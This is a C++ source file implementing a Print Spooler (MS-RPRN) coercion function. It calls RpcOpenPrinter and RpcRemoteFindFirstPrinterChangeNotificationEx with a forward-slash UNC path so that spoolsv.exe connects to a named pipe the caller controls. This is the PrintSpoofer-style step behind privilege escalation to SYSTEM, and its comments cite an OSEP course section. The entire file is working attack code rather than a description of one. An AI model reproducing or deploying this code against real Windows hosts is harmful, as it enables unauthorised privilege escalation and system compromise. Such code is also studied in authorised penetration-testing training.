#include <windows.h>
#include <cstdlib>
#include <cstring>
#include <rpc.h>
#include <iostream>

// MIDL-generated RPC stubs (copied to project root)
#include "ms-rprn_h.h"

#pragma comment(lib, "rpcrt4.lib")

// ============================================================================
// Trigger Print Spooler RPC coercion (MS-RPRN protocol)
// ============================================================================
// This function triggers spoolsv.exe to connect to our named pipe
// by making RPC calls to the Print Spooler service
//
// Parameters:
//   pwszPipeName: UUID string for the named pipe (e.g., "a1b2c3d4-...")
//
// Returns: 0 on success/failure (doesn't matter - we just need spoolsv to try connecting)
extern "C"
DWORD TriggerPrinterBug(LPWSTR pwszPipeName)
{
	PRINTER_HANDLE hPrinter = NULL;
	DEVMODE_CONTAINER devmodeContainer = { 0 };
	LPWSTR pwszComputerName = NULL;
	LPWSTR pwszTargetServer = NULL;
	LPWSTR pwszCaptureServer = NULL;
	char szComputerName[MAX_COMPUTERNAME_LENGTH + 1] = { 0 };
	DWORD dwComputerNameLen = MAX_COMPUTERNAME_LENGTH + 1;

	// Validate input
	if (!pwszPipeName || wcslen(pwszPipeName) == 0) {
		std::cerr << "[-] TriggerPrinterBug: Invalid pipe name\n";
		return 0;
	}

	std::cout << "[*] TriggerPrinterBug called with pipe: " << std::flush;
	std::wcout << pwszPipeName << "\n";

	// Get local computer name (ANSI version, then convert to UNICODE)
	// Note: GetComputerNameA modifies dwComputerNameLen to the length WITHOUT null terminator
	if (!GetComputerNameA(szComputerName, &dwComputerNameLen)) {
		std::cerr << "[-] GetComputerNameA failed: " << GetLastError() << "\n";
		return 0;
	}

	std::cout << "[*] Computer name: " << szComputerName << " (length: " << dwComputerNameLen << ")\n";

	// Allocate buffer for wide computer name (+1 for null terminator)
	std::cout << "[*] Allocating wide computer name buffer (" << (dwComputerNameLen + 1) << " WCHARs)...\n";
	pwszComputerName = (LPWSTR)malloc((dwComputerNameLen + 1) * sizeof(WCHAR));
	if (!pwszComputerName) {
		std::cerr << "[-] Failed to allocate wide computer name buffer\n";
		return 0;
	}

	// Convert ANSI to UNICODE
	std::cout << "[*] Converting computer name to wide...\n";
	int wideLen = MultiByteToWideChar(CP_ACP, 0, szComputerName, (int)(dwComputerNameLen + 1), pwszComputerName, (int)(dwComputerNameLen + 1));
	if (wideLen == 0) {
		std::cerr << "[-] MultiByteToWideChar failed: " << GetLastError() << "\n";
		free(pwszComputerName);
		return 0;
	}
	std::cout << "[*] Wide computer name converted OK\n";

	std::cout << "[*] Allocating target server buffer...\n";
	pwszTargetServer = (LPWSTR)malloc(MAX_PATH * sizeof(WCHAR));
	if (!pwszTargetServer) {
		std::cerr << "[-] Failed to allocate target server buffer\n";
		free(pwszComputerName);
		return 0;
	}

	std::cout << "[*] Allocating capture server buffer...\n";
	pwszCaptureServer = (LPWSTR)malloc(MAX_PATH * sizeof(WCHAR));
	if (!pwszCaptureServer) {
		std::cerr << "[-] Failed to allocate capture server buffer\n";
		free(pwszComputerName);
		free(pwszTargetServer);
		return 0;
	}

	// Build UNC paths for RPC calls
	std::cout << "[*] Building target server path...\n";
	errno_t err1 = wcscpy_s(pwszTargetServer, MAX_PATH / sizeof(WCHAR), L"\\\\");
	errno_t err2 = wcscat_s(pwszTargetServer, MAX_PATH / sizeof(WCHAR), pwszComputerName);
	if (err1 != 0 || err2 != 0) {
		std::cerr << "[-] Failed to build target server: " << err1 << ", " << err2 << "\n";
		free(pwszComputerName);
		free(pwszTargetServer);
		free(pwszCaptureServer);
		return 0;
	}

	std::cout << "[*] Target server: " << std::flush;
	std::wcout << pwszTargetServer << "\n";

	// UNC capture server path: \\hostname/pipe/<uuid> (FORWARD SLASH!)
	// This is the "path normalization trick" from OSEP 16.2.2
	// Print Spooler appends \pipe\spoolss: \\hostname/pipe/<uuid>\pipe\spoolss
	// Windows normalizes / to \: \\hostname\pipe\<uuid>\pipe\spoolss
	std::cout << "[*] Building capture server path...\n";
	errno_t err3 = wcscpy_s(pwszCaptureServer, MAX_PATH / sizeof(WCHAR), L"\\\\");
	errno_t err4 = wcscat_s(pwszCaptureServer, MAX_PATH / sizeof(WCHAR), pwszComputerName);
	errno_t err5 = wcscat_s(pwszCaptureServer, MAX_PATH / sizeof(WCHAR), L"/pipe/");
	errno_t err6 = wcscat_s(pwszCaptureServer, MAX_PATH / sizeof(WCHAR), pwszPipeName);
	if (err3 != 0 || err4 != 0 || err5 != 0 || err6 != 0) {
		std::cerr << "[-] Failed to build capture server: " << err3 << ", " << err4 << ", " << err5 << ", " << err6 << "\n";
		free(pwszComputerName);
		free(pwszTargetServer);
		free(pwszCaptureServer);
		return 0;
	}

	std::cout << "[*] Capture server: " << std::flush;
	std::wcout << pwszCaptureServer << "\n" << std::flush;

	// Summary for diagnostics (similar to SpoolSample output)
	std::cout << "\n========== RPC CALL PARAMETERS ==========\n";
	std::cout << "TargetServer: " << std::flush;
	std::wcout << pwszTargetServer << "\n";
	std::cout << "CaptureServer: " << std::flush;
	std::wcout << pwszCaptureServer << "\n";
	std::cout << "=========================================\n\n";

	// Make RPC calls to trigger spoolsv.exe connection
	// These calls force the Print Spooler service to connect to our named pipe
	std::cout << "[*] About to call RpcOpenPrinter..." << std::flush;
	std::cout << "\n";

	DWORD dwResult = RpcOpenPrinter(pwszTargetServer, &hPrinter, NULL, &devmodeContainer, 0);
	std::cout << "[*] RpcOpenPrinter returned: " << dwResult << "\n";

	if (dwResult == RPC_S_OK)
	{
		std::cout << "[+] RpcOpenPrinter succeeded\n";
		std::cout << "[*] Calling RpcRemoteFindFirstPrinterChangeNotificationEx...\n";

		// This RPC call triggers spoolsv.exe to connect to our named pipe
		dwResult = RpcRemoteFindFirstPrinterChangeNotificationEx(hPrinter, PRINTER_CHANGE_ADD_JOB, 0, pwszCaptureServer, 0, NULL);
		std::cout << "[*] RpcRemoteFindFirstPrinterChangeNotificationEx returned: " << dwResult << "\n";

		RpcClosePrinter(&hPrinter);
	}
	else
	{
		std::cerr << "[-] RpcOpenPrinter failed with error: " << dwResult << "\n";
	}

	// Cleanup
	if (pwszComputerName)
		free(pwszComputerName);
	if (pwszTargetServer)
		free(pwszTargetServer);
	if (pwszCaptureServer)
		free(pwszCaptureServer);

	return 0;
}
